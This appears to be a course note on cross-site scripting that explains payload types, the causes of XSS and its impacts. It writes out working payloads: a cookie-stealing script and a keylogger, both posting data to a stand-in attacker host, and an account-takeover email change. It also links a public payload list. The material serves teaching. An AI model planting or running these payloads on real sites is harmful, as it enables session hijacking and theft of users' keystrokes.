# Cross-Site Scripting

**What is a payload?**

In XSS, the payload is the JavaScript code we wish to be executed on the targets computer. There are two parts to the payload, the intention and the modification.

The intention is what you wish the JavaScript to actually do (which we'll cover with some examples below), and the modification is the changes to the code we need to make it execute as every scenario is different (more on this in the perfecting your payload task).

Here are some examples of XSS intentions.

**Proof Of Concept:**

This is the simplest of payloads where all you want to do is demonstrate that you can achieve XSS on a website. This is often done by causing an alert box to pop up on the page with a string of text, for example:

`<script>alert('XSS');</script>`

**Session Stealing:**

Details of a user's session, such as login tokens, are often kept in cookies on the targets machine. The below JavaScript takes the target's cookie, base64 encodes the cookie to ensure successful transmission and then posts it to a website under the hacker's control to be logged. Once the hacker has these cookies, they can take over the target's session and be logged as that user.

`<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>`

**Key Logger:**

The below code acts as a key logger. This means anything you type on the webpage will be forwarded to a website under the hacker's control. This could be very damaging if the website the payload was installed on accepted user logins or credit card details.

`<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>`

**Business Logic:**

This payload is a lot more specific than the above examples. This would be about calling a particular network resource or a JavaScript function. For example, imagine a JavaScript function for changing the user's email address called `user.changeEmail()`. Your payload could look like this:

`<script>user.changeEmail('attacker@hacker.thm');</script>`

Now that the email address for the account has changed, the attacker may perform a reset password attack.

{% hint style="warning" %}
**Context**

The injected payload will most likely find its way within one of the following:

* Between HTML tags
* Within HTML tags
* Inside JavaScript
{% endhint %}

{% embed url="https://github.com/payloadbox/xss-payload-list" %}

{% file src="../../../../../../../../.gitbook/assets/xss-payload-list.txt" %}

## What Makes XSS Possible

**Insufficient input validation and sanitization**

Web applications accept user data, e.g., via forms, and use this data in the dynamic generation of HTML pages. Consequently, malicious scripts can be embedded as part of the legitimate input and will eventually be executed by the browser unless adequately sanitized.

**Lack of output encoding**

The user can use various characters to alter how a web browser processes and displays a web page. For the HTML part, it is critical to properly encode characters such as `<`, `>`, `"`, `'`, and `&` into their respective HTML encoding. For JavaScript, special attention should be given to escape `'`, `"`, and `\`. Failing to encode user-supplied data correctly is a leading cause of XSS vulnerabilities.

**Improper use of security headers**

Various security headers can help mitigate XSS vulnerabilities. For example, Content Security Policy (CSP) mitigates XSS risks by defining which sources are trusted for executable scripts. A misconfigured CSP, such as overly permissive policies or the improper use of `unsafe-inline` or `unsafe-eval` directives, can make it easier for the attacker to execute their XSS payloads.

**Framework and language vulnerabilities**

Some older web frameworks did not provide security mechanisms against XSS; others have unpatched XSS vulnerabilities. Modern web frameworks automatically escape XSS by design and promptly patch any discovered vulnerability.

**Third-party libraries**

Integrating third-party libraries in a web application can introduce XSS vulnerabilities; even if the core web application is not vulnerable.

## Implications of XSS

There are many implications of XSS. Below, we list a few of them.

**Session hijacking**

As XSS can be used to steal session cookies, attackers can take over the session and impersonate the victim if successful.

**Phishing and credential theft**

Leveraging XSS, attackers can present a fake login prompt to the user. In one recent case, the browser’s page was partially hidden by a dialogue box requesting users to connect to their cryptocurrency wallet.

**Social engineering**

Using XSS, an attacker can create a legitimate-looking pop-up or alert within a trusted website. This can trick users into clicking malicious links or visiting malicious websites.

**Content manipulation and defacement**

In addition to phishing and social engineering, an attacker might use XSS to change the website for other purposes, such as inflicting damage on the company’s reputation.

**Data exfiltration - XSS Leak**

XSS can access and exfiltrate any information displayed on the user’s browser. This includes sensitive information such as personal data and financial information.

**Malware installation**

A sophisticated attacker can use XSS to spread malware. In particular, it can deliver drive-by download attacks on the vulnerable website.
